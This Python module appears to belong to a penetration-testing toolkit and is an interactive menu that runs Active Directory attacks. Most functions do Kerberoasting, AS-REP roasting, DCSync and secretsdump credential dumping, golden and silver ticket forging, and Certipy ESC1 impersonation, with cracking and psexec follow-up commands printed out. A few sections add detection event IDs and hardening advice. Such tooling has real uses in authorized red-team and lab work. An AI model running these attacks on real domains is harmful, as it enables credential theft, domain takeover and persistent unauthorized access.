from __future__ import annotations


from rich.prompt import Prompt

from .utils import console, header, pause, resolve_tool, run_tool


def _impacket(base: str) -> str | None:
    """Impacket scripts vary by distro: GetUserSPNs.py vs impacket-GetUserSPNs."""
    for name in (f"impacket-{base}", f"{base}.py", base):
        if resolve_tool(name):
            return name
    return None


def kerberoast() -> None:
    header("Kerberoast", "Request SPN service tickets -> offline-crackable TGS hashes")
    tool = _impacket("GetUserSPNs")
    if not tool:
        console.print("[yellow]Impacket GetUserSPNs not found[/] (native or WSL). "
                      "Install impacket via the Install Arsenal menu.")
        return pause()
    domain = Prompt.ask("Domain (e.g. corp.local)")
    user = Prompt.ask("Username (any authenticated domain user)")
    pw = Prompt.ask("Password")
    dc = Prompt.ask("DC IP")
    out = "kerberoast.hashes"
    args = [f"{domain}/{user}:{pw}", "-dc-ip", dc, "-request", "-outputfile", out]
    console.print("[dim]Requesting TGS tickets for accounts with SPNs set…[/]")
    run_tool(tool, args)
    console.print(f"\n[green]If successful, hashes are in {out}[/] — crack them:")
    console.print("  [cyan]john --format=krb5tgs --wordlist=rockyou.txt " + out + "[/]")
    console.print("  [cyan]hashcat -m 13100 " + out + " rockyou.txt[/]")
    _detect("Kerberoast",
            "Event ID 4769 (Kerberos service ticket requested) with Ticket "
            "Encryption Type 0x17 (RC4) and Ticket Options 0x40810000 — especially "
            "many 4769s from one account in a short window. Honeypot SPN accounts "
            "detect it with zero false positives.")


def asrep() -> None:
    header("AS-REP Roast", "Dump hashes for accounts with Kerberos pre-auth disabled")
    tool = _impacket("GetNPUsers")
    if not tool:
        console.print("[yellow]Impacket GetNPUsers not found[/] (native or WSL). "
                      "Install impacket via the Install Arsenal menu.")
        return pause()
    domain = Prompt.ask("Domain (e.g. corp.local)")
    mode = Prompt.ask("Target", choices=["userlist", "creds"], default="userlist")
    args: list[str]
    pathify: set[int] = set()
    if mode == "userlist":
        users = Prompt.ask("Path to username list")
        args = [f"{domain}/", "-usersfile", users, "-format", "hashcat", "-no-pass"]
        pathify = {2}
    else:
        user = Prompt.ask("Username")
        pw = Prompt.ask("Password")
        args = [f"{domain}/{user}:{pw}", "-format", "hashcat", "-request"]
    dc = Prompt.ask("DC IP")
    args += ["-dc-ip", dc]
    run_tool(tool, args, wsl_pathify=pathify)
    console.print("\n[green]Crack any recovered AS-REP hashes:[/]")
    console.print("  [cyan]hashcat -m 18200 asrep.hashes rockyou.txt[/]")
    console.print("  [cyan]john --format=krb5asrep --wordlist=rockyou.txt asrep.hashes[/]")
    _detect("AS-REP Roast",
            "Event ID 4768 (TGT requested) with pre-authentication type 0 and RC4 "
            "encryption. Also audit for accounts with 'Do not require Kerberos "
            "preauthentication' set (DONT_REQ_PREAUTH) — that flag is the root cause.")


def bloodhound_collect() -> None:
    header("BloodHound collector", "Enumerate AD and map attack paths (bloodhound-python)")
    if not resolve_tool("bloodhound-python"):
        console.print("[yellow]bloodhound-python not installed[/] — "
                      "[cyan]pipx install bloodhound[/]")
        return pause()
    domain = Prompt.ask("Domain (e.g. corp.local)")
    user = Prompt.ask("Username")
    pw = Prompt.ask("Password")
    dc = Prompt.ask("DC hostname (e.g. dc01.corp.local)")
    dcip = Prompt.ask("DC IP")
    args = ["-u", user, "-p", pw, "-d", domain, "-dc", dc, "-ns", dcip, "-c", "all"]
    console.print("[dim]Collecting users, groups, sessions, ACLs, trusts…[/]")
    run_tool("bloodhound-python", args)
    console.print("\n[green]JSON files written to the current dir.[/] Load them into the "
                  "BloodHound GUI, then run [cyan]Shortest Paths to Domain Admins[/].")
    _detect("BloodHound collection",
            "Bursts of LDAP queries and SAMR/SMB session enumeration from one host. "
            "Honeytoken accounts and unusual 4662 (directory access) volume flag it.")


def kerbrute_users() -> None:
    header("Kerbrute user enum", "Validate usernames via Kerberos pre-auth (no lockout)")
    if not resolve_tool("kerbrute"):
        console.print("[yellow]kerbrute not found[/] — [cyan]go install "
                      "github.com/ropnop/kerbrute@latest[/]")
        return pause()
    domain = Prompt.ask("Domain")
    dc = Prompt.ask("DC IP")
    users = Prompt.ask("Username list path")
    run_tool("kerbrute", ["userenum", "-d", domain, "--dc", dc, users], wsl_pathify={4})
    console.print("[bright_black]Valid users don't trigger 4625/lockout (AS-REQ probing). "
                  "Feed hits into AS-REP roast or a spray.[/]")
    pause()


def dcsync() -> None:
    header("DCSync", "Pull domain hashes via DRSUAPI replication (needs replication rights)")
    tool = _impacket("secretsdump")
    if not tool:
        console.print("[yellow]impacket-secretsdump not found[/] — [cyan]pipx install impacket[/]")
        return pause()
    domain = Prompt.ask("Domain")
    user = Prompt.ask("User (needs DS-Replication rights, e.g. Domain Admin)")
    pw = Prompt.ask("Password (or -hashes LM:NT)")
    dc = Prompt.ask("DC IP/host")
    just = Prompt.ask("Just krbtgt (for golden ticket) or all?", choices=["krbtgt", "all"],
                      default="all")
    args = [f"{domain}/{user}:{pw}@{dc}", "-just-dc"]
    if just == "krbtgt":
        args += ["-just-dc-user", "krbtgt"]
    run_tool(tool, args)
    console.print("\n[green]Grab the krbtgt NT hash + domain SID for a golden ticket (option 6).[/]")
    pause()


def secretsdump() -> None:
    header("secretsdump", "Dump SAM/LSA/cached creds from a host")
    tool = _impacket("secretsdump")
    if not tool:
        console.print("[yellow]impacket-secretsdump not found.[/]")
        return pause()
    domain = Prompt.ask("Domain (or . for local)", default=".")
    user = Prompt.ask("User")
    pw = Prompt.ask("Password")
    target = Prompt.ask("Target IP")
    run_tool(tool, [f"{domain}/{user}:{pw}@{target}"])
    pause()


def golden_ticket() -> None:
    header("Golden ticket", "Forge a TGT with the krbtgt hash — full domain persistence")
    tool = _impacket("ticketer")
    if not tool:
        console.print("[yellow]impacket-ticketer not found.[/]")
        return pause()
    krbtgt = Prompt.ask("krbtgt NT hash")
    sid = Prompt.ask("Domain SID (S-1-5-21-…)")
    domain = Prompt.ask("Domain (FQDN)")
    user = Prompt.ask("Username to forge", default="Administrator")
    run_tool(tool, ["-nthash", krbtgt, "-domain-sid", sid, "-domain", domain, user])
    console.print(f"\n[green]Wrote {user}.ccache.[/] Use it:")
    console.print(f"  [cyan]export KRB5CCNAME={user}.ccache[/]")
    console.print(f"  [cyan]impacket-psexec -k -no-pass {domain}/{user}@<dc>[/]")
    pause()


def silver_ticket() -> None:
    header("Silver ticket", "Forge a service ticket with a service account hash")
    tool = _impacket("ticketer")
    if not tool:
        console.print("[yellow]impacket-ticketer not found.[/]")
        return pause()
    nthash = Prompt.ask("Service account NT hash (or machine acct)")
    sid = Prompt.ask("Domain SID")
    domain = Prompt.ask("Domain (FQDN)")
    spn = Prompt.ask("SPN (e.g. cifs/host.corp.local)")
    user = Prompt.ask("Username to forge", default="Administrator")
    run_tool(tool, ["-nthash", nthash, "-domain-sid", sid, "-domain", domain,
                    "-spn", spn, user])
    console.print(f"\n[green]Wrote {user}.ccache[/] — scoped to that one service.")
    pause()


def _certipy() -> str | None:
    for n in ("certipy", "certipy-ad"):
        if resolve_tool(n):
            return n
    return None


def certipy_find() -> None:
    header("Certipy: find", "Enumerate AD CS for vulnerable templates (ESC1-8)")
    tool = _certipy()
    if not tool:
        console.print("[yellow]certipy not found[/] — [cyan]pipx install certipy-ad[/]")
        return pause()
    domain = Prompt.ask("Domain")
    user = Prompt.ask("User")
    pw = Prompt.ask("Password")
    dc = Prompt.ask("DC IP")
    run_tool(tool, ["find", "-u", f"{user}@{domain}", "-p", pw, "-dc-ip", dc,
                    "-vulnerable", "-stdout"])
    pause()


def certipy_req() -> None:
    header("Certipy: request (ESC1)", "Request a cert as another user via a vulnerable template")
    tool = _certipy()
    if not tool:
        console.print("[yellow]certipy not found.[/]")
        return pause()
    domain = Prompt.ask("Domain")
    user = Prompt.ask("User")
    pw = Prompt.ask("Password")
    ca = Prompt.ask("CA name")
    template = Prompt.ask("Vulnerable template")
    upn = Prompt.ask("Impersonate UPN", default="administrator@" + domain if domain else "administrator")
    dc = Prompt.ask("DC IP")
    run_tool(tool, ["req", "-u", f"{user}@{domain}", "-p", pw, "-ca", ca,
                    "-template", template, "-upn", upn, "-dc-ip", dc])
    console.print("\n[green]Auth with the pfx:[/] "
                  "[cyan]certipy auth -pfx administrator.pfx -dc-ip <ip>[/]  (gets NT hash + TGT)")
    pause()


def hardening() -> None:
    header("AD roasting: defenses", "Reduce exposure to both attacks")
    for line in [
        "[bold]Kerberoast[/]",
        "  · Use (Group) Managed Service Accounts — 120-char random passwords, auto-rotated.",
        "  · Long (25+ char) passwords on any service account with an SPN.",
        "  · Disable RC4 for Kerberos; require AES.",
        "  · Deploy honeypot SPN accounts and alert on any 4769 for them.",
        "",
        "[bold]AS-REP Roast[/]",
        "  · Remove 'Do not require Kerberos preauthentication' from all accounts.",
        "  · Strong passwords so offline cracking fails.",
        "  · Alert on 4768 with preauth type 0.",
    ]:
        console.print(line)
    pause()


def _detect(name: str, text: str) -> None:
    console.print(f"\n[bold]detection ({name}):[/] [bright_black]{text}[/]")
    pause()


MENU = {
    "1": ("Kerberoast (SPN tickets)", kerberoast),
    "2": ("AS-REP Roast (no-preauth)", asrep),
    "3": ("Kerbrute user enum", kerbrute_users),
    "4": ("BloodHound collector", bloodhound_collect),
    "5": ("DCSync (dump domain hashes)", dcsync),
    "6": ("secretsdump (SAM/LSA)", secretsdump),
    "7": ("Golden ticket (forge TGT)", golden_ticket),
    "8": ("Silver ticket (forge service)", silver_ticket),
    "9": ("Certipy: find vuln templates", certipy_find),
    "10": ("Certipy: request cert (ESC1)", certipy_req),
    "11": ("Defenses / hardening", hardening),
}
